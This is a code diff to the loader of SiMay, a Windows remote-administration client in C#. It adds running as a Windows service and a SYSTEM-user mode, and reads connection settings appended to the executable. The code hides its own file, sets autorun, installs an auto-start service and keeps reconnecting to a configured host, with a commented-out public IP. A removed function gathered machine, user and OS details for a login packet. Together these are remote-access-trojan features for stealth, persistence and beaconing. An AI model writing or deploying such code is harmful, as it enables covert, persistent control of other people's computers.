@@ -1,5 +1,5 @@
-﻿using SiMay.RemoteService.Loader.Entitys;
-using SiMay.RemoteService.Loader.Interface;
+﻿using SiMay.Platform.Windows;
+using SiMay.Serialize.Standard;
 using SiMay.Sockets.Tcp;
 using SiMay.Sockets.Tcp.Client;
 using SiMay.Sockets.Tcp.Session;
@@ -10,6 +10,7 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Reflection;
+using System.ServiceProcess;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
@@ -18,6 +19,17 @@ namespace SiMay.RemoteService.Loader
 {
     class Program
     {
+
+        /// <summary>
+        /// 服务启动参数
+        /// </summary>
+        private const string SERVICE_START = "-serviceStart";
+
+        /// <summary>
+        /// SYSTEM用户进程启动参数
+        /// </summary>
+        private const string SERVICE_USER_START = "-user";
+
         private const byte CONNECT_MAIN = 0;
         private const byte CONNECT_WORK = 1;
 
@@ -41,130 +53,121 @@ namespace SiMay.RemoteService.Loader
         private static Dictionary<string, byte[]> _pluginCOMs = new Dictionary<string, byte[]>();
         static void Main(string[] args)
         {
-            _startParameter = new StartParameter()
+            if (args.Any(c => c.Equals(SERVICE_START, StringComparison.OrdinalIgnoreCase)))
             {
-                Host = "127.0.0.1",
-                Port = 5200,
-                GroupName = "默认分组",
-                RemarkInformation = "SiMayService远程管理",
-                IsHide = false,
-                IsMutex = false,
-                IsAutoStart = false,
-                SessionMode = 0,
-                AccessKey = 5200,
-                ServiceVersion = "正式5.0",
-                RunTimeText = DateTime.Now.ToString(),
-                UniqueId = "AAAAAAAAAAAAAAA11111111"
-            };
-            //_startParameter.Host = "94.191.115.121";
-            byte[] binary = File.ReadAllBytes(Application.ExecutablePath);
-            var sign = BitConverter.ToInt16(binary, binary.Length - sizeof(Int16));
-            if (sign == 9999)
-            {
-                var length = BitConverter.ToInt32(binary, binary.Length - sizeof(Int16) - sizeof(Int32));
-                byte[] bytes = new byte[length];
-                Array.Copy(binary, binary.Length - sizeof(Int16) - sizeof(Int32) - length, bytes, 0, length);
-
-                int index = 0;
-                int id_len = BitConverter.ToInt32(bytes, index);
-                index += sizeof(int);
-                string id = Encoding.Unicode.GetString(bytes, index, id_len);
-                index += id_len;
-                int host_len = BitConverter.ToInt32(bytes, index);
-                index += sizeof(int);
-                string host = Encoding.Unicode.GetString(bytes, index, host_len);
-                index += host_len;
-                int port = BitConverter.ToInt32(bytes, index);
-                index += sizeof(int);
-                int des_len = BitConverter.ToInt32(bytes, index);
-                index += sizeof(int);
-                string des = Encoding.Unicode.GetString(bytes, index, des_len);
-                index += des_len;
-                int group_len = BitConverter.ToInt32(bytes, index);
-                index += sizeof(int);
-                string groupName = Encoding.Unicode.GetString(bytes, index, group_len);
-                index += group_len;
-                bool isHide = BitConverter.ToBoolean(bytes, index);
-                index += sizeof(bool);
-                bool isAutoStart = BitConverter.ToBoolean(bytes, index);
-                index += sizeof(bool);
-                int sessionMode = BitConverter.ToInt32(bytes, index);
-                index += sizeof(int);
-                int accessKey = BitConverter.ToInt32(bytes, index);
-                index += sizeof(int);
-                bool isMutex = BitConverter.ToBoolean(bytes, index);
-                index += sizeof(bool);
-
-                _startParameter.Host = host;
-                _startParameter.Port = port;
-                _startParameter.RemarkInformation = des;
-                _startParameter.IsAutoStart = isAutoStart;
-                _startParameter.IsHide = isHide;
-                _startParameter.AccessKey = accessKey;
-                _startParameter.SessionMode = sessionMode;
-                _startParameter.UniqueId = id;
-                _startParameter.IsMutex = isMutex;
-                _startParameter.GroupName = groupName;
-            }
-
-            if (_startParameter.IsMutex)
-            {
-                //进程互斥体
-                Mutex MyMutex = new Mutex(true, "SiMayService", out var bExist);
-                if (!bExist)
-                    Environment.Exit(0);
-            }
-
-            if (_startParameter.IsHide)
-                CommonHelper.SetExecutingFileHide(true);
-
-            if (_startParameter.IsAutoStart)
-                CommonHelper.SetAutoRun(true);
-
-            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
-            Application.ThreadException += Application_ThreadException;
-
-            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
-            AppDomain.CurrentDomain.AssemblyResolve += (s, p) =>
-            {
-                var key = p.Name.Split(',')[0] + ".dll";
-                var assembly = Assembly.Load(_pluginCOMs[key]);
-                _pluginCOMs.Remove(key);
-                return assembly;
-            };
-
-            var clientConfig = new TcpSocketSaeaClientConfiguration();
-            if (_startParameter.SessionMode == 0)
-            {
-                //服务版配置
-                clientConfig.AppKeepAlive = true;
-                clientConfig.KeepAlive = false;
-            }
-            else
-            {
-                //中间服务器版服务端配置
-                clientConfig.AppKeepAlive = false;
-                clientConfig.KeepAlive = true;
-            }
-            clientConfig.KeepAliveInterval = 5000;
-            clientConfig.KeepAliveSpanTime = 1000;
-            _clientAgent = TcpSocketsFactory.CreateClientAgent(TcpSocketSaeaSessionType.Packet, clientConfig, Notify);
-            while (true) //第一次解析域名,直至解析成功
-            {
-                var ip = CommonHelper.GetHostByName(_startParameter.Host);
-                if (ip != null)
+                ServiceBase.Run(new ServiceBase[]
                 {
-                    _iPEndPoint = new IPEndPoint(IPAddress.Parse(ip), _startParameter.Port);
-                    break;
+                    new Service()
+                });
+            }
+            else//非服务启动
+            {
+                _startParameter = new StartParameter()
+                {
+                    Host = "127.0.0.1",
+                    Port = 5200,
+                    GroupName = "默认分组",
+                    RemarkInformation = "SiMayService远程管理",
+                    IsHide = false,
+                    IsMutex = false,
+                    IsAutoStart = false,
+                    SessionMode = 0,
+                    AccessKey = 5200,
+                    ServiceVersion = "正式5.0",
+                    RunTimeText = DateTime.Now.ToString(),
+                    UniqueId = "AAAAAAAAAAAAAAA11111111"
+                };
+                //_startParameter.Host = "94.191.115.121";
+                byte[] binary = File.ReadAllBytes(Application.ExecutablePath);
+                var sign = BitConverter.ToInt16(binary, binary.Length - sizeof(Int16));
+                if (sign == 9999)
+                {
+                    var length = BitConverter.ToInt32(binary, binary.Length - sizeof(Int16) - sizeof(Int32));
+                    byte[] bytes = new byte[length];
+                    Array.Copy(binary, binary.Length - sizeof(Int16) - sizeof(Int32) - length, bytes, 0, length);
+
+                    var options = PacketSerializeHelper.DeserializePacket<Core.Entitys.ServiceOptions>(bytes);
+                    _startParameter.Host = options.Host;
+                    _startParameter.Port = options.Port;
+                    _startParameter.RemarkInformation = options.Remark;
+                    _startParameter.IsAutoStart = options.IsAutoRun;
+                    _startParameter.IsHide = options.IsHide;
+                    _startParameter.AccessKey = options.AccessKey;
+                    _startParameter.SessionMode = options.SessionMode;
+                    _startParameter.UniqueId = options.Id + $"_{Environment.MachineName}";
+                    _startParameter.IsMutex = options.IsMutex;
+                    _startParameter.GroupName = options.GroupName;
+                    _startParameter.InstallService = options.InstallService;
+                    _startParameter.ServiceName = options.ServiceName;
+                    _startParameter.ServiceDisplayName = options.ServiceDisplayName;
                 }
 
-                Console.WriteLine(_startParameter.Host ?? "address analysis is null");
+                if (_startParameter.IsMutex)
+                {
+                    //进程互斥体
+                    Mutex MyMutex = new Mutex(true, $"{_startParameter.UniqueId}_SiMayService", out var bExist);
+                    if (!bExist)
+                        Environment.Exit(0);
+                }
 
-                Thread.Sleep(5000);
+                if (_startParameter.IsHide)
+                    SystemSessionHelper.FileHide(true);
+
+                if (_startParameter.IsAutoStart)
+                    SystemSessionHelper.SetAutoRun(true);
+
+                if (args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase)))
+                    new UserTrunkContext(args);
+
+                //非SYSTEM用户进程启动则进入安装服务
+                if (_startParameter.InstallService && !args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase)))
+                    SystemSessionHelper.InstallAutoStartService(_startParameter.ServiceName, _startParameter.ServiceDisplayName);
+
+                Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
+                Application.ThreadException += Application_ThreadException;
+
+                AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
+                AppDomain.CurrentDomain.AssemblyResolve += (s, p) =>
+                {
+                    var key = p.Name.Split(',')[0] + ".dll";
+                    var assembly = Assembly.Load(_pluginCOMs[key]);
+                    _pluginCOMs.Remove(key);
+                    return assembly;
+                };
+
+                var clientConfig = new TcpSocketSaeaClientConfiguration();
+                if (_startParameter.SessionMode == 0)
+                {
+                    //服务版配置
+                    clientConfig.AppKeepAlive = true;
+                    clientConfig.KeepAlive = false;
+                }
+                else
+                {
+                    //中间服务器版服务端配置
+                    clientConfig.AppKeepAlive = false;
+                    clientConfig.KeepAlive = true;
+                }
+                clientConfig.KeepAliveInterval = 5000;
+                clientConfig.KeepAliveSpanTime = 1000;
+                _clientAgent = TcpSocketsFactory.CreateClientAgent(TcpSocketSaeaSessionType.Packet, clientConfig, Notify);
+                while (true) //第一次解析域名,直至解析成功
+                {
+                    var ip = GetHostByName(_startParameter.Host);
+                    if (ip != null)
+                    {
+                        _iPEndPoint = new IPEndPoint(IPAddress.Parse(ip), _startParameter.Port);
+                        break;
+                    }
+
+                    Console.WriteLine(_startParameter.Host ?? "address analysis is null");
+
+                    Thread.Sleep(5000);
+                }
+                ConnectToServer();
+
+                Application.Run();
             }
-            ConnectToServer();
-
-            Application.Run();
         }
 
 
@@ -172,7 +175,7 @@ namespace SiMay.RemoteService.Loader
         {
             ThreadPool.QueueUserWorkItem(x =>
             {
-                var ip = CommonHelper.GetHostByName(_startParameter.Host);//尝试解析域名
+                var ip = GetHostByName(_startParameter.Host);//尝试解析域名
                 if (ip == null)
                     return;
                 _iPEndPoint = new IPEndPoint(IPAddress.Parse(ip), _startParameter.Port);
@@ -245,56 +248,7 @@ namespace SiMay.RemoteService.Loader
             return ack;
         }
 
-        public static byte[] BuilerTempLoginPacket()
-        {
-            var builderLst = new List<byte>();
 
-            BuilderAdd(builderLst, SystemInforUtil.LocalIPV4);
-            BuilderAdd(builderLst, Environment.MachineName);
-
-            string remarkInfomation = AppConfiguartion.RemarkInfomation ?? _startParameter.RemarkInformation;
-            BuilderAdd(builderLst, remarkInfomation);
-
-            var groupName = AppConfiguartion.GroupName ?? _startParameter.GroupName;
-            BuilderAdd(builderLst, groupName);
-
-
-            builderLst.AddRange(BitConverter.GetBytes(Environment.ProcessorCount));
-            BuilderAdd(builderLst, SystemInforUtil.LocalCpuInfo);
-            builderLst.AddRange(BitConverter.GetBytes(SystemInforUtil.LocalMemorySize));
-            BuilderAdd(builderLst, _startParameter.RunTimeText);
-            BuilderAdd(builderLst, _startParameter.ServiceVersion);
-            BuilderAdd(builderLst, Environment.UserName);
-            BuilderAdd(builderLst, SystemInforUtil.OSFullName);
-
-            var isOpenScreenView = AppConfiguartion.IsOpenScreenView ?? "true";
-            builderLst.Add((byte)(isOpenScreenView == "true" ? 1 : 0));
-            builderLst.Add(0);
-            builderLst.Add(0);
-            builderLst.Add(0);
-
-            BuilderAdd(builderLst, _startParameter.UniqueId);
-
-            builderLst.Add(0);
-
-            if (!int.TryParse(AppConfiguartion.ScreenRecordHeight, out int _screen_record_height))
-                _screen_record_height = 800;
-
-            builderLst.AddRange(BitConverter.GetBytes(_screen_record_height));
-
-            if (!int.TryParse(AppConfiguartion.ScreenRecordWidth, out int _screen_record_width))
-                _screen_record_width = 1200;
-
-            builderLst.AddRange(BitConverter.GetBytes(_screen_record_width));
-
-            if (!int.TryParse(AppConfiguartion.ScreenRecordSpanTime, out int _screen_record_spantime))
-                _screen_record_spantime = 3000;
-            builderLst.AddRange(BitConverter.GetBytes(_screen_record_spantime));
-
-            builderLst.Add(0);//未加载插件标识位
-
-            return builderLst.ToArray();
-        }
 
         private static void BuilderAdd(List<byte> buffers, string text)
         {
@@ -337,7 +291,19 @@ namespace SiMay.RemoteService.Loader
                 _appMainService = Activator.CreateInstance(mainType, _startParameter, _clientAgent, session, _iPEndPoint) as IAppMainService;
             }
         }
+        public static string GetHostByName(string host)
+        {
+            string _return = null;
+            try
+            {
+                IPHostEntry hostinfo = Dns.GetHostByName(host);
+                IPAddress[] aryIP = hostinfo.AddressList;
+                _return = aryIP[0].ToString();
+            }
+            catch { }
 
+            return _return;
+        }
 
         private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
         {
